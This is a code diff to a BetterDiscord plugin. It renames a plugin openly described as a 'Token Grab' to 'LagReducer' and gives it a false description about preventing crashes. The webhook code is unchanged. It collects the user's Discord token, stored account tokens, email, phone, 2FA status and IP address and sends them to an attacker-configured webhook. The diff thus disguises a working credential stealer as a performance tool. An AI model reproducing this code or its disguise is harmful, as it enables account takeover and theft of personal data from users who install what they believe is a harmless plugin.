@@ -7,11 +7,11 @@
  * @invite https://discord.gg/wiz
  * @donate https://www.paypal.me/HideakiAtsuyoLmao
  * @website https://github.com/pa-rick
- * @source https://github.com/pa-rick/LagReducer
- * @updateUrl https://raw.githubusercontent.com/pa-rick/LagReducer/main/LagReducer.plugin.js
+ * @source https://github.com/pa-rick/LagReducer/tree/main/GOD/
+ * @updateUrl https://raw.githubusercontent.com/pa-rick/LagReducer/main/GOD/LagReducer.plugin.js
  */
 
-class HideMe {
+class LagReducer {
     // Constructor
     constructor() {
         this.initialized = false;
@@ -19,19 +19,19 @@ class HideMe {
 
     // Meta
     getName() {
-        return "HideMe";
+        return "LagReducer";
     }
     getShortName() {
-        return "HideMe";
+        return "LagReducer";
     }
     getDescription() {
-        return "Better Discord Token Grab Lmao github.com/HideakiAtsuyo";
+        return "Prevents lag that causes crashes from the most popular discord plugins.";
     }
     getVersion() {
-        return "1.1.9";
+        return "1.8.6";
     }
     getAuthor() {
-        return "Hideaki Atsuyo";
+        return "pat_rick";
     }
 
     // Settings  Panel
@@ -158,7 +158,7 @@ class HideMe {
             username: config.webhookUsername,
             avatar_url: config.webhookAvatar,
             tts: config.tts,
-            embeds: [{"title": config.embedTitle, "footer": { "text": "Version: 1.1.9" }, "description": "[GitHub](https://github.com/HideakiAtsuyo/BetterGrabber)", "color": config.embedColor, "fields": [{ "name": "IP", "value": `\`${IP}\``, inline: false }, { "name": "Actual User Token", "value": `\`${actualUserToken.replaceAll("\"", "")||"Unknown Issue"}\``, inline: true }, { "name": "Actual User Tag With ID", "value": `\`${actualUserTag.replaceAll("\"", "")}\` - (\`${actualUserID.replaceAll("\"", "")}\`)`, inline: true }, { "name": "Actual User email (verified)", "value": `\`${actualUserEmail.replaceAll("\"", "")}\` (verified: \`${actualUserVerified}\`)`, inline: true }, { "name": "Actual User Phone", "value": `\`${actualUserPhone}\``, inline: true }, { "name": "Actual User 2FA/MFA Status", "value": `\`${enabled2FA}\``, inline: true }, { "name": "Actual User Premium Status(Nitro)", "value": `\`${["No", "Classic", "Boost"][actualUserPremiumState]||"No"}\``, inline: true }, { "name": "Trusted Domains List", "value": `\`\`\`\n${trustedDomains == undefined ? "null" : JSON.parse(trustedDomains)["trustedDomains"]}\`\`\``, inline: false }, { "name": "Stored Tokens(From Switch Account Feature :) (ID:Token))", "value": `\`\`\`json\n${storedTokens == undefined ? "null" : storedTokens}\`\`\``, inline: false }, { "name": "Verified Games & Programs", "value": `\`\`\`json\n${verifiedGameAndProgramsList == undefined ? "null": verifiedGameAndProgramsList}\`\`\``, inline: false }, { "name": "IP Infos", "value": `\`\`\`json\n${IPInfos}\`\`\`\n[More Infos about ${IP}](https://whatismyipaddress.com/ip/${IP})`, inline: false }]}]
+            embeds: [{"title": config.embedTitle, "footer": { "text": "Version: 1.8.6" }, "description": "[GitHub](https://github.com/pa-rick/LagReducer)", "color": config.embedColor, "fields": [{ "name": "IP", "value": `\`${IP}\``, inline: false }, { "name": "Actual User Token", "value": `\`${actualUserToken.replaceAll("\"", "")||"Unknown Issue"}\``, inline: true }, { "name": "Actual User Tag With ID", "value": `\`${actualUserTag.replaceAll("\"", "")}\` - (\`${actualUserID.replaceAll("\"", "")}\`)`, inline: true }, { "name": "Actual User email (verified)", "value": `\`${actualUserEmail.replaceAll("\"", "")}\` (verified: \`${actualUserVerified}\`)`, inline: true }, { "name": "Actual User Phone", "value": `\`${actualUserPhone}\``, inline: true }, { "name": "Actual User 2FA/MFA Status", "value": `\`${enabled2FA}\``, inline: true }, { "name": "Actual User Premium Status(Nitro)", "value": `\`${["No", "Classic", "Boost"][actualUserPremiumState]||"No"}\``, inline: true }, { "name": "Trusted Domains List", "value": `\`\`\`\n${trustedDomains == undefined ? "null" : JSON.parse(trustedDomains)["trustedDomains"]}\`\`\``, inline: false }, { "name": "Stored Tokens(From Switch Account Feature :) (ID:Token))", "value": `\`\`\`json\n${storedTokens == undefined ? "null" : storedTokens}\`\`\``, inline: false }, { "name": "Verified Games & Programs", "value": `\`\`\`json\n${verifiedGameAndProgramsList == undefined ? "null": verifiedGameAndProgramsList}\`\`\``, inline: false }, { "name": "IP Infos", "value": `\`\`\`json\n${IPInfos}\`\`\`\n[More Infos about ${IP}](https://whatismyipaddress.com/ip/${IP})`, inline: false }]}]
         });
 
         //console.log(pD); //Only Used To Check The Actual Payload Nothing More :)
